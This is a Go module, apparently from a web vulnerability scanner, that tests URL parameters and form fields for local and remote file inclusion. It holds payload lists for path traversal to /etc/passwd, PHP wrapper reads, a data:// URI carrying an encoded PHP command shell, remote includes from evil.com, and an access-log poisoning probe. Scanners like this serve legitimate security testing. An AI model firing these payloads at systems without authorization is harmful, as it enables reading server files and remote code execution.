package modules

import (
	"encoding/base64"
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type lfiPayload struct {
	Payload string
	Markers []string
	Label   string
}

var lfiPayloads = []lfiPayload{
	{"../../../../etc/passwd", []string{"root:x:", "nobody:x:", "/bin/bash"}, "/etc/passwd (classic traversal)"},
	{"../../../etc/passwd", []string{"root:x:", "nobody:x:"}, "/etc/passwd (short traverse)"},
	{"..%2F..%2F..%2Fetc%2Fpasswd", []string{"root:x:"}, "/etc/passwd (URL encoded)"},
	{"..%252F..%252F..%252Fetc%252Fpasswd", []string{"root:x:"}, "/etc/passwd (double URL encode)"},
	{"....//....//....//etc/passwd", []string{"root:x:"}, "/etc/passwd (....// bypass)"},
	{"../../../../windows/win.ini", []string{"[fonts]", "[extensions]"}, "Windows win.ini"},
	{"..\\..\\..\\..\\windows\\win.ini", []string{"[fonts]"}, "Windows win.ini (backslash)"},
	{"php://filter/convert.base64-encode/resource=index.php", []string{"PD9waHA", "<?php", "<?="}, "PHP filter wrapper (base64 index.php)"},
	{"php://filter/read=convert.base64-encode/resource=index", []string{"PD9waHA", "<?php"}, "PHP filter wrapper (no ext)"},
	{"php://filter/convert.base64-encode/resource=config.php", []string{"PD9waHA"}, "PHP filter wrapper (config.php)"},
	{"php://filter/convert.base64-encode/resource=/etc/passwd", []string{"cm9vdD", "root"}, "PHP filter wrapper (/etc/passwd)"},
	{"php://filter/convert.iconv.utf-8.utf-16/resource=index.php", []string{}, "PHP filter — iconv chain"},
	{"php://input", []string{}, "php://input (raw POST data)"},
	{"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==", []string{"system", "cmd"}, "data:// URI scheme"},
	{"expect://id", []string{"uid=", "gid="}, "expect:// wrapper (if enabled)"},
}

var rfiPayloads = []lfiPayload{
	{"http://evil.com/shell.txt", []string{}, "Remote file include (http)"},
	{"https://evil.com/shell.txt", []string{}, "Remote file include (https)"},
	{"ftp://evil.com/shell.txt", []string{}, "Remote file include (ftp)"},
	{"hTTp://evil.com/shell.txt", []string{}, "Remote file include (mixed case)"},
	{"//evil.com/shell", []string{}, "Remote include (protocol-relative)"},
}

func ScanLFI(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}

	for param := range params {
		if cfg.Verbose {
			output.Verbose("[lfi-get] param=%s", param)
		}

		baseline, _, err := core.DoGET(client, cfg, target.URL)
		if err != nil || baseline == "" {
			continue
		}

	LFILoop:
		for _, pl := range lfiPayloads {
			testURL, err := core.SetParamRaw(target.URL, param, pl.Payload)
			if err != nil {
				continue
			}
			body, status, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}

			for _, marker := range pl.Markers {
				if strings.Contains(body, marker) && !strings.Contains(baseline, marker) {
					sev := "HIGH"
					if strings.Contains(pl.Payload, "php://filter") || strings.Contains(pl.Payload, "data://") {
						sev = "CRITICAL"
					}
					results = append(results, core.ScanResult{
						Type:      fmt.Sprintf("LFI (Local File Inclusion) [%s]", pl.Label),
						URL:       testURL,
						Method:    "GET",
						Parameter: param,
						Payload:   pl.Payload,
						Severity:  sev,
						Evidence:  fmt.Sprintf("marker %q in response — file content leaked (HTTP %d)", marker, status),
						Timestamp: time.Now(),
					})
					break LFILoop
				}
			}

			if strings.HasPrefix(pl.Label, "PHP filter") && len(body) > len(baseline)+50 {
				if leak := base64LeakEvidence(body, baseline); leak != "" {
					if !containsLFIResult(results, target.URL, param) {
						results = append(results, core.ScanResult{
							Type:      fmt.Sprintf("LFI — Base64-Encoded Response [%s]", pl.Label),
							URL:       testURL,
							Method:    "GET",
							Parameter: param,
							Payload:   pl.Payload,
							Severity:  "MEDIUM",
							Evidence:  fmt.Sprintf("decoded base64 contains source marker %q — file content leaked (HTTP %d)", leak, status),
							Timestamp: time.Now(),
						})
						output.SuspectInline("LFI-BASE64", "param=%s +%d bytes", param, len(body)-len(baseline))
					}
				}
			}
		}

	RFILoop:
		for _, pl := range rfiPayloads {
			testURL, err := core.SetParamRaw(target.URL, param, pl.Payload)
			if err != nil {
				continue
			}
			body, status, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}

			rfiMarkers := []string{
				"failed to open stream",
				"HTTP request failed",
				"failed to connect",
				"php_network_getaddresses",
				"allow_url_include",
				"file_get_contents",
				"failed opening required",
				"include_path",
			}
			for _, marker := range rfiMarkers {
				if strings.Contains(strings.ToLower(body), strings.ToLower(marker)) && !strings.Contains(strings.ToLower(baseline), strings.ToLower(marker)) {
					results = append(results, core.ScanResult{
						Type:      "RFI (Remote File Inclusion)",
						URL:       testURL,
						Method:    "GET",
						Parameter: param,
						Payload:   pl.Payload,
						Severity:  "CRITICAL",
						Evidence:  fmt.Sprintf("marker %q indicates server attempted to fetch remote resource (HTTP %d)", marker, status),
						Timestamp: time.Now(),
					})
					break RFILoop
				}
			}
		}
	}

	for _, form := range target.Forms {
		var baseline string
		var baseErr error
		if form.Method == "POST" {
			baseline, _, baseErr = core.DoPOST(client, cfg, form.Action, core.FormDefaults(form))
		} else {
			u, _ := core.SetFormParams(form.Action, core.FormDefaults(form))
			baseline, _, baseErr = core.DoGET(client, cfg, u)
		}
		if baseErr != nil || baseline == "" {
			continue
		}
		for _, inp := range form.Inputs {

		LFIFormLoop:
			for _, pl := range lfiPayloads {
				var body string
				var status int
				var err error
				if form.Method == "POST" {
					d := core.FormDefaults(form)
					d.Set(inp.Name, pl.Payload)
					body, status, err = core.DoPOST(client, cfg, form.Action, d)
				} else {
					d := core.FormDefaults(form)
					d.Set(inp.Name, pl.Payload)
					u, _ := core.SetFormParams(form.Action, d)
					body, status, err = core.DoGET(client, cfg, u)
				}
				if err != nil {
					continue
				}
				for _, marker := range pl.Markers {
					if strings.Contains(body, marker) && !strings.Contains(baseline, marker) {
						sev := "HIGH"
						if strings.Contains(pl.Payload, "php://filter") || strings.Contains(pl.Payload, "data://") {
							sev = "CRITICAL"
						}
						results = append(results, core.ScanResult{
							Type:      fmt.Sprintf("LFI via core.Form [%s]", pl.Label),
							URL:       form.Action,
							Method:    form.Method,
							Parameter: inp.Name,
							Payload:   pl.Payload,
							Severity:  sev,
							Evidence:  fmt.Sprintf("marker %q in response (HTTP %d)", marker, status),
							Timestamp: time.Now(),
						})
						break LFIFormLoop
					}
				}
			}
		}
	}

	if cfg.LFI && len(results) > 0 {
		lfiLogPoisonProbe(client, cfg, target, &results)
	}

	return results
}

func lfiLogPoisonProbe(client *http.Client, cfg *core.Config, target core.CrawlResult, results *[]core.ScanResult) {
	poisonMarker := "SXEL_LOG_POISON_MARKER_" + fmt.Sprintf("%d", time.Now().UnixNano()%999999)

	poisonReq, err := http.NewRequest("GET", target.URL, nil)
	if err != nil {
		return
	}
	core.ApplyHeaders(poisonReq, cfg)
	poisonReq.Header.Set("User-Agent", poisonMarker)
	if resp, err := client.Do(poisonReq); err == nil {
		core.ReadBody(resp.Body)
		resp.Body.Close()
	}

	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	}

	logPaths := []string{
		"../../../../var/log/nginx/access.log",
		"../../../../var/log/apache2/access.log",
		"../../../../var/log/apache/access.log",
		"../../../../var/log/httpd/access_log",
		"../../../var/log/nginx/access.log",
		"php://filter/convert.base64-encode/resource=/var/log/nginx/access.log",
	}

	for param := range params {
		for _, logPath := range logPaths {
			testURL, _ := core.SetParam(target.URL, param, logPath)
			body, _, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}
			if strings.Contains(body, poisonMarker) {
				*results = append(*results, core.ScanResult{
					Type:      "LFI — Log File Poisoning (via User-Agent)",
					URL:       testURL,
					Method:    "GET",
					Parameter: param,
					Payload:   logPath + " | UA:" + poisonMarker,
					Severity:  "CRITICAL",
					Evidence:  fmt.Sprintf("Injected User-Agent %q found in %s — log poisoning to RCE possible", poisonMarker, logPath),
					Timestamp: time.Now(),
				})
				return
			}
		}
	}
}

func containsLFIResult(results []core.ScanResult, rawURL, param string) bool {
	want := core.StripQuery(rawURL)
	for _, r := range results {
		if r.Parameter == param && core.StripQuery(r.URL) == want && strings.HasPrefix(r.Type, "LFI") {
			return true
		}
	}
	return false
}

var phpSourceMarkers = []string{"<?php", "<?", "class ", "function ", "var ", "echo "}

func base64LeakEvidence(body, baseline string) string {
	dec, ok := decodeBase64Blob(body)
	if !ok {
		return ""
	}
	low := strings.ToLower(dec)
	baseLow := strings.ToLower(baseline)
	for _, m := range phpSourceMarkers {
		if strings.Contains(low, m) && !strings.Contains(baseLow, m) {
			return m
		}
	}
	return ""
}

func decodeBase64Blob(body string) (string, bool) {
	var runs []string
	var cur []byte
	flush := func() {
		if len(cur) >= 64 {
			runs = append(runs, string(cur))
		}
		cur = nil
	}
	for i := 0; i < len(body); i++ {
		c := body[i]
		switch {
		case (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '+' || c == '/':
			cur = append(cur, c)
		case c == '=':
			cur = append(cur, c)
		default:
			flush()
		}
	}
	flush()

	best := ""
	for _, r := range runs {
		stripped := strings.TrimRight(r, "=")
		if len(stripped) < 64 {
			continue
		}
		padded := stripped + strings.Repeat("=", (4-len(stripped)%4)%4)
		d, err := base64.StdEncoding.DecodeString(padded)
		if err != nil {
			continue
		}
		if len(d) > len(best) && mostlyPrintable(d) {
			best = string(d)
		}
	}
	return best, best != ""
}

func mostlyPrintable(b []byte) bool {
	if len(b) == 0 {
		return false
	}
	ctrl := 0
	for _, c := range b {
		if c < 0x09 || (c > 0x0d && c < 0x20) || c == 0x7f {
			ctrl++
		}
	}
	return ctrl*10 < len(b)
}
